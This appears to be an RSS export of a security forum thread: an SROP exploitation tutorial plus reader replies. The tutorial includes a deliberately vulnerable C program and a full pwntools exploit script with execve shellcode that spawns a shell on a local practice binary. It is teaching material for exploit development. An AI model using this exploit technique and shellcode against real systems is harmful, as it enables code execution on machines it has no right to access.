<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>SROP | Signals, you say?</title>
    <link>https://0x00sec.org/t/srop-signals-you-say/2890</link>
    <description>## Sigreturn Oriented Programming
In the name of Allah, the most beneficent, the most merciful.
___
- Hello everyone to a new boring article, after we took a small look on normal ROP stuff, I decided to write something more fun :smile:!
- @_py is the one that started that idea! :wink: 
- for learning purposes :smiley:.. 
- I hope you learn much!

###What&#39;s so special about SROP?``

&gt; It needs only a small syscall; ret; gadget, and a way to set EAX to syscall number of sigreturn!

- While you need much gadgets to ROP, 1 ~ 2 to SROP!
- Sometimes, you need to combine both :smiley:..

###How can we SROP?``

- We want to exploit the weakness that lies in UNIX systems, sigreturn()..
- This function when called, restores all registers from stack, with no further checks..
- We know that the signal form looks like this:

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/0/0df0da262f0ffab1be896d1c6b6ebce4584e2ef2.gif&quot; width=&quot;560&quot; height=&quot;500&quot;&gt;

### Solving an x64 simple binary, the SROP way!
- Suppose we have an overflow ( Nullbytes shouldn&#39;t be removed ), allowing us to overwrite the saved RIP.. and a little gadget that will allow us set RAX value to 15 :smile:..
- We can simply set saved RIP to the gadget, and we build a fake signal frame, that&#39;ll allow us do ANYTHING WE WANT, SINCE WE WILL CONTROL ALL REGISTERS :wink:! 
- Let&#39;s write a small binary that contains these ingredients :smiley:!

```c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

void syscall_(){
       __asm__(&quot;syscall; ret;&quot;);
}

void set_rax(){
       __asm__(&quot;movl $0xf, %eax; ret;&quot;);
}

int main(){
       // ONLY SROP!
       char buff[100];
       printf(&quot;Buff @%p, can you SROP?\n&quot;, buff);
       read(0, buff, 5000);
       return 0;
}
```

#### Let&#39;s start by controlling RIP!

- We keep filling the stack until we get SIGSEGV, and we subtract one from it, leading to get the perfect padding! :slight_smile:

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/f/fdc3d6267be7075df7cbc7106d0324e2a1d42904.png&quot; width=&quot;518&quot; height=&quot;148&quot;&gt;

- The padding to saved RIP is 120 :wink:, let&#39;s check it!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/3/3ac28738bfeb1fff8e675f113bfa27c83de6556e.png&quot; width=&quot;593&quot; height=&quot;78&quot;&gt;

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/5/57b81690b61c02c1f6316d01f865b60c626a1bc5.png&quot; width=&quot;271&quot; height=&quot;41&quot;&gt;

#### Writing the exploit
- We gained control over RIP, let&#39;s start writing our exploit.py!

```python
#!/usr/bin/python
from pwn import *

context.clear(arch=&quot;amd64&quot;)
c = process(&quot;./srop&quot;)
pad = 120

# EXPLOIT
payload = &quot;A&quot; * pad # FILL STACK TILL SAVED RIP
payload += &quot;BBBB&quot; # OVERWRITING SAVED RIP WITH BBBB

# SENDING
c.sendline(payload)

c.interactive()
```

- [pwntools](http://docs.pwntools.com/en/stable/rop/srop.html).. Always making our life easier :rofl:..
- Because of pwntools, we won&#39;t write the whole chain ( you can write it if you want )! :laughing:
- Let&#39;s first collect, the useful gadgets for our attack!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/3/3c9bb0b45eb4f7fd8d8f64d6290e1402b0a3f9e2.png&quot; width=&quot;379&quot; height=&quot;43&quot;&gt;

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/6/608ca4a1b4e6d0d7b916352c1af84adb68fe162f.png&quot; width=&quot;427&quot; height=&quot;42&quot;&gt;

```python
# ENTRIES
syscall_ret = 0x40054a
mov_rax_15_ret = 0x400554
```

- Also there&#39;s some kind of leak, the address of buff, is something we have!
- Let&#39;s write a small part to take that leak before sending the payload!

```python
# LEAK
c.recvuntil(&quot;@0x&quot;)
leak = int(c.recvuntil(&quot;,&quot;)[:-1], 16)
print &quot;Buff @ &quot; + hex(leak)
```

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/8/8ba452d1cfb1048bbf3858c354690d94868eb9ea.png&quot; width=&quot;437&quot; height=&quot;91&quot;&gt;

- All working good! :smiley:
- Let&#39;s now start editing the EXPLOIT part! 
- The plan i&#39;m going to do, is to make the Buff address executable, and return to it!
- To do so, i&#39;m going to craft a signalframe that will be able to call mprotect on buff address..
- We are going to test on an address, and try making it executable!

```python
pause() # STOP TO ATTACH GDB
test = 0x601000 # TEST ADDRESS
# EXPLOIT
payload = &quot;A&quot; * pad # FILLING STACK TO SAVED RIP
payload += p64(mov_rax_15_ret) # SET RAX TO SIGRETURN SYSCALL NUMBER
payload += p64(syscall_ret) # CALL SIGRETURN
# BUILD FAKE FRAME
frame = SigreturnFrame(kernel=&quot;amd64&quot;) # CREATING A SIGRETURN FRAME
frame.rax = 10 # SET RAX TO MPROTECT SYSCALL NUMBER
frame.rdi = test # SET RDI TO TEST ADDRESS
frame.rsi = 2000 # SET RSI TO SIZE
frame.rdx = 7 # SET RDX =&gt; RWX PERMISSION
frame.rsp = leak + len(payload) + 248 # WHERE 248 IS SIZE OF FAKE FRAME!
frame.rip = syscall_ret # SET RIP TO SYSCALL ADDRESS
# PLACE FAKE FRAME ON STACK
payload += str(frame)
payload += &quot;AAAA&quot; # WHERE IT GOING TO RETURN ( RSP )
```

&gt; Stack is going to look like this:
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/7/73c128f7d309724ea18993ef18a5b457596170b2.png&quot; width=&quot;690&quot; height=&quot;319&quot;&gt;

- Let&#39;s run the exploit and attach it!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/8/83ad5067a523cc307eb990cb4b7f33cc181198a0.png&quot; width=&quot;578&quot; height=&quot;78&quot;&gt;

- Write &#39;c&#39; in GDB to continue, and press enter in exploit.py tab to resume!
- BEAAAAAAAAM, RIP in it&#39;s right place, let&#39;s check if the address has now RWX permissions!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/c/c1e2260374a098ce76635aee3383b7bd4af9d295.png&quot; width=&quot;621&quot; height=&quot;110&quot;&gt;

- RWX! let&#39;s now take advantage of that and instead of test address, we are going to make buff address executable!

```python
pause() # STOP TO ATTACH GDB
shellcode = &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot; # x86_64 EXECVE SHELLCODE
# EXPLOIT
payload = shellcode # PLACING SHELLCODE IN BEGINNING OF BUFF
payload = payload.ljust(pad, &quot;A&quot;) # FILLING STACK TO SAVED RIP
payload += p64(mov_rax_15_ret) # SET RAX TO SIGRETURN SYSCALL NUMBER
payload += p64(syscall_ret) # CALL SIGRETURN
# BUILD FAKE FRAME
frame = SigreturnFrame(kernel=&quot;amd64&quot;) # CREATING A SIGRETURN FRAME
frame.rax = 10 # SET RAX TO MPROTECT SYSCALL NUMBER
frame.rdi = leak # SET RDI TO BUFF ADDRESS
frame.rsi = 2000 # SET RSI TO SIZE
frame.rdx = 7 # SET RDX =&gt; RWX PERMISSION
frame.rsp = leak + len(payload) + 248 # WHERE 248 IS SIZE OF FAKE FRAME!
frame.rip = syscall_ret # SET RIP TO SYSCALL ADDRESS
# PLACE FAKE FRAME ON STACK
payload += str(frame)
payload += p64(leak) # RETURN2SHELLCODE
```

- Let&#39;s run our exploit! :blush:

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/e/ea5c2fba6a47e5a1d1fe83753673cbdb39d9380d.png&quot; width=&quot;408&quot; height=&quot;146&quot;&gt;

- We got our shell, we won :smile:!

#### Full exploit

```python
#!/usr/bin/python
from pwn import *

context.clear(arch=&quot;amd64&quot;)
c = process(&quot;./srop&quot;)
pad = 120

# ENTRIES
syscall_ret = 0x40054a
mov_rax_15_ret = 0x400554

# LEAK
c.recvuntil(&quot;@0x&quot;)
leak = int(c.recvuntil(&quot;,&quot;)[:-1], 16)
print &quot;Buff @ &quot; + hex(leak)

pause() # STOP TO ATTACH GDB
shellcode = &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot; # x86_64 EXECVE SHELLCODE
# EXPLOIT
payload = shellcode # PLACING SHELLCODE IN BEGINNING OF BUFF
payload = payload.ljust(pad, &quot;A&quot;) # FILLING STACK TO SAVED RIP
payload += p64(mov_rax_15_ret) # SET RAX TO SIGRETURN SYSCALL NUMBER
payload += p64(syscall_ret) # CALL SIGRETURN
# BUILD FAKE FRAME
frame = SigreturnFrame(kernel=&quot;amd64&quot;) # CREATING A SIGRETURN FRAME
frame.rax = 10 # SET RAX TO MPROTECT SYSCALL NUMBER
frame.rdi = leak # SET RDI TO BUFF ADDRESS
frame.rsi = 2000 # SET RSI TO SIZE
frame.rdx = 7 # SET RDX =&gt; RWX PERMISSION
frame.rsp = leak + len(payload) + 248 # WHERE 248 IS SIZE OF FAKE FRAME, CAUSE WE STILL NEED TO CONTROL RIP AFTER!
frame.rip = syscall_ret # SET RIP TO SYSCALL ADDRESS
# PLACE FAKE FRAME IN STACK
payload += str(frame)
payload += p64(leak) # RETURN2SHELLCODE

# SENDING
c.sendline(payload)

c.interactive()
```
Reference links:
[PDF](https://subs.emis.de/LNI/Proceedings/Proceedings259/2077.pdf)
[ThisIsSecurity](https://thisissecurity.net/2015/01/03/playing-with-signals-an-overview-on-sigreturn-oriented-programming/)

### Challenge on x86
- To start your adventure in the SROP world, you should to start simple!
- The target is, a simple x86 [binary](https://transfer.sh/z6qEz/mad)!

&gt; Proof that it&#39;s working, and exploitable:
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/a/ad09b64cbc3e86dcc0a04836fb8cc56ed04cd074.png&quot; width=&quot;418&quot; height=&quot;113&quot;&gt;

- I made that binary just to help myself understand SROP better, and exploit it on my own :smiley:! 
- But now, it&#39;s your turn, to exploit a such binary!
 &lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/8/828a03814074db9fad4c6a169c2c6d144cc90f50.gif&quot; width=&quot;356&quot; height=&quot;200&quot;&gt;

- Good luck. Search much, and learn much! :wink:

~ exploit</description>
    
    <lastBuildDate>Sat, 18 Nov 2017 16:42:32 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://0x00sec.org/t/srop-signals-you-say/2890.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 43 hours. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/26">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/26</link>
        <pubDate>Sat, 18 Nov 2017 18:00:17 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-26</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <div class="spoiler"><a href="https://0x00sec.org/t/srop-signals-you-say/2890/25">spoiler</a></div>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/25">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/25</link>
        <pubDate>Sat, 18 Nov 2017 16:42:32 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-25</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[neolex]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a></p>
<p>[spoiler]Ok so I have to read 0x77 character to store 0x77 in eax and then call the syscall…</p>
<p>I have the frame syscall but it segfault, is it possible to make a execve direct from the frame or do I have to use the mprotect technique ?</p>
<p>I have eax = 0xb  EBX: 0x804a01f ("/bin/sh") ECX: 0x804a01f ("/bin/sh") and ESP 0x804a01f ("/bin/sh") but it segfault on int 0x80…<br>
Sorry <img src="https://0x00sec.org/images/emoji/twitter/confused.png?v=9" title=":confused:" class="emoji" alt=":confused:"><br>
[/spoiler]</p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/24">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/24</link>
        <pubDate>Sat, 18 Nov 2017 16:26:46 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-24</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/neolex">@neolex</a></p>
<div class="spoiler"><a href="https://0x00sec.org/t/srop-signals-you-say/2890/23">spoiler</a></div>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/23">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/23</link>
        <pubDate>Sat, 18 Nov 2017 13:32:06 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-23</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[neolex]]></dc:creator>
        <description><![CDATA[
            <p>Hey Thanks <a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a> !</p>
<div class="spoiler"><a href="https://0x00sec.org/t/srop-signals-you-say/2890/22">spoiler</a></div>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/22">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/22</link>
        <pubDate>Sat, 18 Nov 2017 12:30:52 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-22</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/sloth">@sloth</a> I did SROP on 64bit and gave a 32bit binary, so people can search more and learn more! <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"><br>
<a class="mention" href="https://0x00sec.org/u/neolex">@neolex</a> Here you <a href="https://transfer.sh/K6Fl1/mad" rel="nofollow noopener">go</a>, happy you liked the article! <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:"></p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/21">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/21</link>
        <pubDate>Fri, 17 Nov 2017 16:57:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-21</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[sloth]]></dc:creator>
        <description><![CDATA[
            <p>Just compile the source code with -m32. The challenge was to use the method on x86, therefore that should be enough</p>
<pre><code>gcc source.c -m32 -o binary</code></pre>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/20">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/20</link>
        <pubDate>Fri, 17 Nov 2017 16:41:46 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-20</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[neolex]]></dc:creator>
        <description><![CDATA[
            <p>Great article, thank you !<br>
Can you re-upload the binary for the challenge please ?</p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/19">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/19</link>
        <pubDate>Fri, 17 Nov 2017 15:51:36 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-19</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[sloth]]></dc:creator>
        <description><![CDATA[
            <p>Great explanation!<br>
One thing i noticed during a walktrough was that with  <code>int mprotect(void *addr, size_t len, int prot);</code> you need to specify an multiple or the start of an page, otherwise it will not set the permissions correctly. (see man mprotect, EINVAL for more…)</p>
<p>So to calculate the beginning of a page simple calculate it the following way: <code> addr &amp; ~(page_size-1)</code><br>
where addr is your pointer and page_size is 4096 most of the time.</p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/18">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/18</link>
        <pubDate>Thu, 16 Nov 2017 14:57:43 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-18</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <ul>
<li>
<a class="mention" href="https://0x00sec.org/u/gtx">@gtx</a> Happy you liked it <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">!</li>
</ul>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/17">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/17</link>
        <pubDate>Fri, 14 Jul 2017 11:08:28 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-17</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <ul>
<li>
<a class="mention" href="https://0x00sec.org/u/zachriggle">@zachriggle</a> Thank you so much for your tip! I’ll surely use them in my next write-ups! Thank you for creating pwntools, such an amazing tool! <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">
</li>
</ul>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/16">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/16</link>
        <pubDate>Fri, 14 Jul 2017 11:07:50 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-16</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[gtx]]></dc:creator>
        <description><![CDATA[
            <p>Excellent write-up <a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a> !</p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/15">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/15</link>
        <pubDate>Fri, 14 Jul 2017 10:43:59 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-15</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[zachriggle]]></dc:creator>
        <description><![CDATA[
            <p>Hey, pwntools developer here!</p>
<p>Here’s some additional pro tips you may want to integrate into your blog</p>
<pre><code class="lang-auto">payload = str(foo)
payload += pack(bar)
payload += baz
</code></pre>
<p>Can be collapsed down into a single statement with the <code>flat()</code> function.</p>
<pre><code class="lang-auto">payload = flat(foo, bar, baz)
</code></pre>
<p>Integers are passed to pack, strings are untouched, and everything else gets <code>__pack__()</code> invoked on it.</p>
<p>Additionally, it looks like you’re aligning your payload to a specific boundary.  There is another routine, <code>fit()</code>, which handles this automagically <em>and</em> makes the padding a valid <code>cyclic()</code> offset.  This way, if you mess up offsets, you will have e.g. <code>"faab"</code> instead of <code>"AAAA"</code>.</p>
<pre><code class="lang-auto">pad = cyclic_find("faab")
# 120
</code></pre>
<p>The way that this works with <code>fit()</code> would look like:</p>
<pre><code class="lang-auto">payload = fit({
    pad: "BBBB" # Overwriting saved RIP with BBBB
})
</code></pre>
<p><code>fit()</code> just calls <code>flat()</code> on everything passed to it, so you can pass arrays of things to be set at a given offset.</p>
<pre><code class="lang-auto">payload = fit({
  0: shellcode,          # PLACING SHELLCODE IN BEGINNING OF BUFF
  pad: [mov_rax_15_ret,  # SET RAX TO SIGRETURN SYSCALL NUMBER
        syscall_ret,     # CALL SIGRETURN
        frame,           # PLACE FAKE FRAME ON STACK
        leak]            # RETURN2SHELLCODE
})
</code></pre>
<p>For attaching with GDB, you might want to look at the Pwntools function <code>gdb.attach()</code> and <code>gdb.debug()</code>!</p>
<p>Finally, a small nit: You don’t have to specify <code>kernel=</code> for <code>SigreturnFrame</code> unless the target arch is <code>i386</code>.  Since it’s <code>amd64</code>, this is unnecessary.</p>
<p>Thanks for the article, and thanks for using Pwntools!</p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/14</link>
        <pubDate>Fri, 14 Jul 2017 03:15:26 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-14</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <p>*_* Thank you! <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:"></p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/13</link>
        <pubDate>Thu, 13 Jul 2017 11:01:50 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-13</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[febri]]></dc:creator>
        <description><![CDATA[
            <p>awesome article <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/12</link>
        <pubDate>Thu, 13 Jul 2017 05:31:43 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-12</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <p>Thank you! <img src="https://0x00sec.org/images/emoji/twitter/laughing.png?v=9" title=":laughing:" class="emoji" alt=":laughing:"></p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/11</link>
        <pubDate>Wed, 12 Jul 2017 15:23:55 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-11</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <p>awesome article <a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a>. I’m on this one with <a class="mention" href="https://0x00sec.org/u/fraq">@fraq</a> tho. Need to reread it a few times to fully grasp to potential here! <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/10</link>
        <pubDate>Wed, 12 Jul 2017 15:17:26 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-10</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <blockquote>
<p>Well done, and no problem *_*! <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"><br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/a/a4770c2019a457c7f313ac07706c71c78e109e62.gif" width="500" height="281"></p>
</blockquote>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/9</link>
        <pubDate>Wed, 12 Jul 2017 11:44:02 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-9</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Done. Thanks for the challenge mate! <a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a> requested not to release the exploit code yet so that more folks can give it a shot.</p>
<p>You can find the PoC <a href="https://asciinema.org/a/YdiZnENwxGtsI61D9BnHANpRi" rel="nofollow noopener">here</a>.</p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/8</link>
        <pubDate>Wed, 12 Jul 2017 11:41:58 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-8</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <p>Happy you liked it <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">!</p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/7</link>
        <pubDate>Tue, 11 Jul 2017 20:41:47 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-7</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[fraq]]></dc:creator>
        <description><![CDATA[
            <p>I’m gonna have to read this a few more times to fully digest. This is super good.</p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/6</link>
        <pubDate>Tue, 11 Jul 2017 20:35:11 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-6</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <p>Thank you *_* ! <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/5</link>
        <pubDate>Tue, 11 Jul 2017 20:11:47 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-5</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Nice write-up <a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a>!</p>
<p>For those who don’t quite get the theory behind that technique, I’d highly recommend reading the reference links.</p>
<p>TL;DR - When a signal occurs, the kernel “pauses” the process’s execution in order to jump to a signal handler routine. In order to safely resume the execution after the handler, the context of that process is pushed/saved on the stack (registers, flags, instruction pointer, stack pointer etc). When the handler is finished, sigreturn() is being called which will restore the context of the process by popping the values off of the stack. That’s what is being exploited in that technique.</p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/4</link>
        <pubDate>Tue, 11 Jul 2017 20:07:58 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-4</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
